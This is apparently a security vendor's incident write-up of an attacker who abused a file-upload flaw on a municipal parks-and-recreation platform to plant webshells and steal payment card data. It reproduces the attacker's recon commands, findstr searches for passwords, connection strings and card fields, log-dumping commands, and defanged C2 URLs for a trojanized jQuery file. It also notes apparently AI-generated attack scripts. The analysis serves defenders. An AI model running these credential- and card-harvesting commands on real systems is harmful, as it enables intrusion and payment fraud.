---
title: Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers | Huntress
author: Cristian Poenaru; Susannah Matt
url: https://www.huntress.com/blog/parks-recreation-platform-webshell-attack
hostname: huntress.com
description: Huntress SOC found a threat actor exploiting a file upload flaw in recreation management to breach 3 municipal servers and steal payment data.
sitename: Huntress
date: "2026-09-30"
---
*Acknowledgments**: Special thanks to Olly Maxwell for his contributions to this investigation and write-up.*

## Background

On September 10, 2026, Huntress observed a threat actor compromising multiple tenants on a shared recreation management software platform using one repeatable trick: register a member account, upload a malicious file, and turn it into a webshell.

The webshells were used to execute malicious activity across three web servers. Attempting to identify and extract sensitive information, they enumerated and probed the payment/secure tenant and planted disguised copies where its folders existed.

The attacker adapted their tradecraft throughout all three compromises. They learned, got quieter, added anti-forensics, and then walked straight back in after a server was cleaned but not fully locked down.

Below, we tell the full story of the attack in four acts, outlining the adversary's learning curve and the different techniques used.

## **Act 1: Loud and clumsy on the first server** 

The attacker was determined to get in, spending roughly 6 hours throwing unauthenticated exploitation technique after technique at the web server, perhaps with the help of AI-generated scripts.

Attempted initial access techniques included:

- Brute forcing two different login pages
- IIS 8.3 tilde enumeration
- WebDAV write verbs
- Upload-handler parser bypasses
- Forced browsing

The initial brute-force attempts against the admin login page, ending in `/management/login.aspx`, and the members' login page `/info/household/login.aspx` were met with HTTP result code 200 (try again) rather than 302 (redirect to management or members page). 

Undeterred, the attacker then attempted multiple probing techniques, including exploiting an IIS 8.3 tilde vulnerability by crafting a request containing the tilde character, such as `a*~1*,` to enumerate hidden files and directories. 

After that failed, the attacker pivoted to HTTP method manipulation, trying eight different WebDAV methods testing for improper access controls on target files. Every attempt failed except the `OPTIONS` method, which returned the available methods allowed by the web server.

Other failed probes included modifying the webserver's `Upload.ashx` and `FileUpload.ashx` dynamic script files, appending `::$DATA` to NTFS Alternative Data Streams, and attempting to bypass simple string-matching rules with case flipping.

### Access granted: Recon and payment data theft

After all those failed attempts, the simplest method worked: the front door. After registering a new account on the platform, the attacker was able to upload malicious files directly to the `/documents/MemberFiles/` directory.

The attacker uploaded 14 files to the `/documents/MemberFiles/` directory, including `.aspx`, `.jpg`, and `.pdf` formats. The `.jpg` and `.pdf` files were uploaded as an extension execution test; only the `.aspx` files were used to execute commands.

```
/documents/MemberFiles/12345_67890_3798c7ce-aa7d-4056-8061-8f32887196b9.aspx 
/documents/MemberFiles/12345_67890_37e910ed-5893-4e83-a45c-188a5e4686fd.aspx 
/documents/MemberFiles/12345_67890_43823089-2ae9-4d05-ae6d-ad10ccf25ed9.aspx 
/documents/MemberFiles/12345_67890_6cb1a848-ed12-4938-9661-f4034526d911.aspx 
/documents/MemberFiles/12345_67890_cf151067-8362-42b6-8906-4a33eaaa4bb0.aspx 
/documents/MemberFiles/12345_67890_d194a682-5ef0-4da3-b162-01844bf0109e.aspx 
/documents/MemberFiles/12345_67890_14b84a7c-791a-4e96-a5ea-e5c7cfd35fd2.jpg 
/documents/MemberFiles/12345_67890_1e0debea-4bfd-48d2-a5b4-8554ec7c0a34.pdf 
/documents/MemberFiles/12345_67890_8ce925b7-db18-4803-89b3-44513340e2d6.pdf
/documents/MemberFiles/12345_67890_9d7c2766-ba86-4a01-a4a0-9fb4a969bc33.jpg 
/documents/MemberFiles/12345_67890_9dfe12b7-b663-4ccb-8605-b02f37137f1f.pdf 
/documents/MemberFiles/12345_67890_c752ff19-7679-4f81-84d0-72a0ebe58a95.jpg 
/documents/MemberFiles/12345_67890_de139098-fa5f-4132-9fce-03f06e38a825.aspx 
/documents/MemberFiles/12345_67890_ff0b7fd2-d568-44a2-99ef-89dc3113d2a9.aspx
```
The `.aspx` webshells executed enumeration commands on the server, giving the attacker the lay of the land by gathering host information, listing IIS servers, and most importantly, hunting for cardholder data.

The initial enumeration attempted to gather identity and execution context:

```
cmd.exe /c whoami
cmd.exe /c id
cmd.exe /c hostname
cmd.exe /c cd
cmd.exe /c echo %USERPROFILE%
cmd.exe /c dir D:\ /b
cmd.exe /c echo %APP_POOL_ID%
cmd.exe /c set
```

Further local host OS enumeration targeted the IIS web worker process `hosts` file, which manually maps the hostnames (domain names) directly to their IP address. Enumerating network connections and configuration is crucial to identifying lateral movement paths.

```
cmd.exe /c ipconfig 
cmd.exe /c net user
cmd.exe /c systeminfo
cmd.exe /c type C:\Windows\System32\drivers\etc\hosts
cmd.exe /c netstat -ano | findstr LISTENING
cmd.exe /c wmic process where "name='w3wp.exe'" get ProcessId,CommandLine /format:list
cmd.exe /c tasklist /fi "imagename eq w3wp.exe"
```
The attacker then used standard IIS and Windows administration tools `appcmd.exe` and `powershell.exe` to enumerate IIS sites and map configurations for all hosted sites, virtual directories, application bindings, and running application pools:

```
cmd.exe /c %windir%\system32\inetsrv\appcmd.exe list sites
cmd.exe /c %windir%\system32\inetsrv\appcmd.exe list vdirs
cmd.exe /c %windir%\system32\inetsrv\appcmd.exe list app
powershell -NoProfile -Command "Import-Module WebAdministration -ErrorAction SilentlyContinue; Get-Website | Format-List *; Get-WebBinding | Format-Table -AutoSize"
```
The attacker also searched for the following:

- Standard IIS root paths ( `C:\inetpub\wwwroot` )
- Alternative web roots ( `C:\sites` , `C:\www` , `C:\wwwroot` , `C:\WebSites` )
 Multi-tenant environment directories across E:\ (`Websites` , `IIS, Content` , `Applications, SSL` )
- Root directories of secondary drives ( `D:\` , `E:\` , `F:\` ) to map attached storage and locate external application hosting paths.
- Web directories for configuration files ( `*.config` ) to identify application settings or connection strings,
- Temporary IIS AppPool files ( `C:\inetpub\temp\appPools` )
- Domain-related configuration files on drive `C:\`


Attempting to harvest sensitive credentials and database connection details from the IIS environment, the attacker extracted the global IIS configuration file (`applicationHost.config`) to retrieve server-wide settings, virtual directory paths, and encrypted/plaintext credentials stored at the web server level. 

They also executed targeted string searches across specific web.config files and C# source files (`*.cs`) for sensitive keywords, including database connection strings, passwords, data sources, user IDs, API keys (`AccountKey`, `TransactionKey`), and encryption keys (`machineKey`, `impersonate`). 

```
cmd.exe /c dir /b E:\Content\info\App_Code\*DB* E:\Content\info\App_Code\*Sql* E:\Content\info\App_Code\*Data* 2>nul
cmd.exe /c findstr /i /c:"connectionString" /c:"ConnectionString" /c:"password" /c:"Password" /c:"Data Source" E:\Content\info\web.config
cmd.exe /c findstr /i /n "connectionString Data Source Initial Catalog User ID Password" E:\Content\management\web.config
cmd.exe /c findstr /s /i /n "connectionString ConnectionString SqlConnection Data Source Initial Catalog" E:\Content\info\App_Code\*.cs
```
Using PowerShell to programmatically parse target `web.config` files as XML, they then extracted connection string names and sensitive database credentials formatted as clean output strings. With the SQL credentials now at their disposal, the threat actor's motive became clear: obtain sensitive information related to payment information and card data. 

*Figure 1:* *Sqlcmd* *is used to connect to the database with the obtained SQL credentials and search cardholder data.*

Finally, the threat actor continued hunting for cardholder data by targeting related strings (CVV, card number, expiration dates) across the content directory:

```
cmd.exe /c findstr /s /i /m /c:"CVV" /c:"CardNumber" /c:"CreditCard" /c:"CCNumber" /c:"CardNum" /c:"ExpMonth" /c:"ExpYear" /c:"Expiration" E:\Content\info\*.aspx E:\Content\info\*.cs E:\Content\info\*.vb 2>nul
cmd.exe /c findstr /s /i /m /c:"CVV" /c:"CardNumber" /c:"CreditCard" /c:"CCNumber" /c:"CardNum" E:\Content\management\*.aspx E:\Content\management\*.cs E:\Content\management\*.vb 2>nul 
cmd.exe /c findstr /s /i /c:"CVV" /c:"CardNumber" /c:"CreditCard" E:\Content\info\*.config 2>nul
```
They targeted specific payment solutions platforms with the following command:

`cmd.exe /c findstr /s /i /m "AuthorizeNet Fortis CardConnect BluePay PayPal Braintree Stripe" E:\Content\info\*.*`
With their eye on payment transaction logs generated by a Fortis webhook integration, the attacker identified and sorted raw webhook log files by timestamp, and attempted automated file reading before manually dumping specific log files to extract payment card details, including expiration dates, CVVs, and credit card numbers.

```
cmd.exe /c dir /o-d /b E:\Content\info\_fortis\Webhooks\*.txt 
cmd /c "for /f %i in ('dir /b /o-d E:\Content\info\_fortis\Webhooks\*.txt') do @type E:\Content\info\_fortis\Webhooks\%i & @echo ----END---- & @goto :done & :done" 500 (errored) 
cmd.exe /c type E:\Content\info\_fortis\Webhooks\2026_09_08_REDACTED.txt 
cmd.exe /c type E:\Content\info\_fortis\Webhooks\2026_09_08_REDACTED.txt 
cmd.exe /c findstr /i "exp_date exp_month exp_year expiration cvv first_six last_four card_number" E:\Content\info\_fortis\Webhooks\2026_09_08_REDACTED.txt
```
The user agent `Mozilla/5.0+(Windows+NT;+Windows+NT+10.0;+zh-CN)+WindowsPowerShell/5.1.22621.1037` identifies the system locale as Simplified Chinese (Mainland China) via its string: `+zh-CN`. From here, we can deduce that the threat actor is most likely based in China.

## **Act 2: Quiet and efficient on the second server**

Having already found a way in and mapped the environment, the attacker generated a lot less noise when compromising a second web server, once again registering a new account and abusing the upload functionality to deploy webshells. 

This turned out to be a very short act for the threat actor, with only a few enumeration commands targeting the host and web directories, and attempting to find their own uploaded shell, mainly the filename post-upload, before they got removed by the Huntress SOC.

```
cmd.exe /c dir /b E:\Content
cmd.exe /c dir /b E:\Websites_Other
cmd.exe /c dir /b E:\Websites\REDACTED
cmd.exe /c dir /b E:\Websites\REDACTED\http
cmd.exe /c dir /s /b E:\Websites\REDACTED\*78099729* 2>nul
powershell -NoProfile -Command "Get-ChildItem E:\Websites\REDACTED -Recurse -Filter <redacted accountID>_<redacted memberID>_*.aspx -EA 0 | Select -Expand FullName"
```
*Figure 2: IIS worker process spawns* *cmd.exe* *for enumeration commands.*


Now familiar with the platform's naming convention used for file uploads (the account ID and member ID), the attacker collected full filenames, most likely to be able to rename or copy the files across the web directories. More on that in Act 3.

## **Act 3: Deliberately stealthy on the third server**

After Huntress locked down the first two servers, the threat actor detected and targeted a third web server, with the prior knowledge already established, they wasted no time.

The attack started with the account registration as before, followed by the file uploads, a total of five webshells uploaded to `Documents\MemberFiles`.

Once again, [__reconnaissance__](https://www.huntress.com/blog/ad-rms-architecture-and-recon) was required on the new server, and the attacker followed the same pattern previously observed:

```
cmd.exe /c whoami&hostname
dir /b E:\ dir /b E:\Websites 2>nul 
dir /b E:\Content 2>nul dir /s /b E:\*secure* 2>nul 
dir /s /b E:\Websites\*secure* 2>nul 
findstr /s /i /m "secure.REDACTED" E:\Content\info\App_Code\*.cs 2>nul 
dir /b C:\inetpub\temp\appPools 2>nul 
type C:\Windows\System32\drivers\etc\hosts
```
Now knowing their full filenames, the attacker was able to call up previously uploaded webshells and copy them using `cmd.exe` commands on the host `cmd /c if not exist "<dir>" mkdir "<dir>" & copy /y "<shell>" "<target>"`.

```
E:\Content\info\includes\css_bundle.aspx
E:\Content\info\master\jquery.validate.min.aspx
E:\Content\management\includes\css_bundle.aspx
E:\Websites\REDACTED.com\http\css_bundle.aspx
E:\Websites\REDACTED.com\http\Images\webresource.aspx
```
Masquerading the webshells as legitimate files proved not to be enough. Likely sensing that defenders were onto them, the attacker employed another defense evading mechanism: timestomping. The attacker manipulated the metadata in the web config file `E:\Websites\REDACTED.com\http\web.config` so the webshell files inherited the same last modified, last accessed, and creation time as legitimate components of the website.

*Figure 3: Deconstructed PowerShell command executed for timestomping*

With timestomping complete, the attack once again went digging into the platform's payment systems with commands looking for target payment folders without throwing visible file errors:

```
dir /b "E:\Websites\secure.REDACTED.com\http\mxmerchant" 2>nul
dir /b "E:\Websites\secure.REDACTED.com\http\fortis" 2>nul
```
Once confirming the existence of `mxmerchant`, `fortis` payment modules, the attacker leveraged conditional `if exist` logic and attempted to dynamically drop persistence copies of the webshells as `css_bundle.aspx` within the directories. This attempt failed, with no webshells detected within the payment modules directories.

## **Act 4: Back for the encore on the third server**

When the third server was put back into production prematurely, the threat actor returned with a vengeance. What stands out in this final act is not only the techniques used but also the detection of what appears to be AI-generated scripts.


Using the same account they previously registered, the attacker returned to the compromised server with a new mission: a larger-scale attack targeting the platform's users directly by injecting a trojan within the authentication page `/auth/default.aspx` loads the jQuery file `*\includes\jquery\jquery.mousewheel-3.0.6.pack.js` for the payload injection.


The attacker leveraged PowerShell and JavaScript files uploaded into `C:\Windows\Temp` directory initially as Base64-encoded files with `.b64` extension appended, before being decoded into actual `.ps1` and `.js` files.

```
C:\Windows\Temp\plant_ccrtc_mousewheel.ps1.b64
C:\Windows\Temp\plant_ccrtc_mousewheel.ps1
C:\Windows\Temp\plant_ccrtc_fast.ps1.ps1.b64
C:\Windows\Temp\plant_ccrtc_fast.ps1.ps1
C:\Windows\Temp\ccrtc_sdk_init.js.b64
C:\Windows\Temp\ccrtc_sdk_init.js
```
The two PowerShell scripts served the same purpose but differently:

- A deep recursive scanner `(plant_ccrtc_mousewheel.ps1` ) that searched across all filesystem drives
- A refined, low-noise variant ( `plant_ccrtc_fast.ps1` ) optimized to perform shallow searches strictly under known web roots to reduce CPU/disk I/O and evade EDR detection.


Executing the planter appended the obfuscated dropper into the legitimate jQuery asset, utilizing an idempotency guard (`function _0x9d66`) to prevent duplicate writes, and timestomping the target file back to its original UTC timestamps to evade forensic timeline analysis. 


The attacker intended to convert every visiting browser to `/auth/default.aspx` into an encrypted C2 client. Once loaded, the trojanized jQuery file injected a secondary browser agent from `hxxps://chat.ririmochii[.]workers[.]dev/core[.]js`, establishing encrypted WebRTC and WebSocket channels back to the following attacker-controlled C2 infrastructure to push dynamic `eval()` frames and harvest credentials in real time:

- `hxxps://fk.bubuneeko[.]workers[.]dev/_cf/rel`
- `hxxps://fk.bubuneeko[.]workers[.]dev/_cf/ice`
- `wss://fk.bubuneeko[.]workers[.]dev/_cf/soc`

*Figure 4: The attack chain when the attacker returned to the third compromised server* 

Using the naming convention of the uploaded webshells, we were able to match the accounts used with the activity initiated in this final act. The attacker immediately attempted to task the previously uploaded files  `css_bundle.aspx, query.validate.min.aspx,` and `webresource.aspx`. After realizing these files had been remediated, they uploaded new webshells with the same tested tradecraft that worked before.

The uploaded `.ps1` files searched for `query.mousewheel-3.0.6.pack.js` and appended the payload into it. They also appear to be AI generated, with the extensive comments including parts of the provided instructions, such as "`# Fast plant: candidate paths only, no drive recurse. Run ON web host.`" and "`# append only -  do not rewrite head/structure`" 

## Conclusion: If at first you don't succeed, try making your own account

The change in tactics and additional effort placed in staying stealthy throughout these four acts demonstrates how threat actors are capable of adjusting in real time. The initial attempts during the first act were noisy and clumsy, and may have even been initiated via an AI-generated automation script due to the high volume of attempts. The attacker ultimately achieved initial access with a more manual approach: creating their own account on the platform and finding a flaw in the upload function.

This attack is a stark reminder that the cat-and-mouse game between attacker and defender is rarely a story of flawless execution. It is a messy process of trial and error, where the attacker's missteps, leftover artifacts, and noisy iterations ultimately hand the defenders the keys to their unraveling.

## Indicators of Compromise (IOCs)

| **Item** | **Description** | 
|---|---|
| `wf9x` | Webshell key used during the first act | 
| `m7Qx2pL9` | Webshell key used in the second, third, and fourth acts | 
| `Mozilla/5.0+(Windows+NT;+Windows+NT+10.0;+zh-CN)+WindowsPowerShell/5.1.22621.1037` | User-agent used during the attack | 
| `Plant_ccrtc_mousewheel.ps1` **SHA256:** `0d8f7bf30aa1ac95d59fed24c433dd2b3d57767f38c088721699c841c6e861d3` | PowerShell script file | 
| `Plant_ccrtc_mousewheel.ps1.b64` **SHA256:** `5f69ff7a2e024f94cc5f816fa16c90054b09d9ac430b1f8b0631dfdd4472905e` | Base64 encoded PowerShell script file | 
| `Plant_ccrtc_fast.ps1` **SHA256:** `e9dee286069afb6b411febb96b91a963cd16baffbf8b6aa951e0ef1a7e0e3879` | PowerShell script file | 
| `Plant_ccrtc_fast.ps1.b64` **SHA256:** `0d93c3a8ded46887f79ac4ca7f238c458de2231243176f6c05062e34f238d19a` | Base64-encoded PowerShell script file | 
| `Ccrtc_sdk_init.js` **SHA256:** `b06b581d91f4108900d188c3ee1af18502a8cb65d4e101663b791bd670867485` | JavaScript file | 
| `Ccrtc_sdk_init.js.b64` **SHA256:** `7bb594a77f726bf21a49f717024f2915f82f47eb623d2ad305259301de1f1ab4` | Base64-encoded JavaScript file | 
| `hxxps[://]chat[.]ririmochii[.]workers[.]dev/core[.]js` | Second stage "core" payload URL | 
| `hxxps[://]fk[.]bubuneeko[.]workers[.]dev/_cf/rel` | WebRTC signaling/relay URL | 
| `hxxps[://]fk[.]bubuneeko[.]workers[.]dev/_cf/ice` | ICE/TURN credential fetch URL | 
| `wss[://]fk[.]bubuneeko[.]workers[.]dev` | WebSocket C2 fallback URL | 
| `function _0x9d66` | Idempotency string |
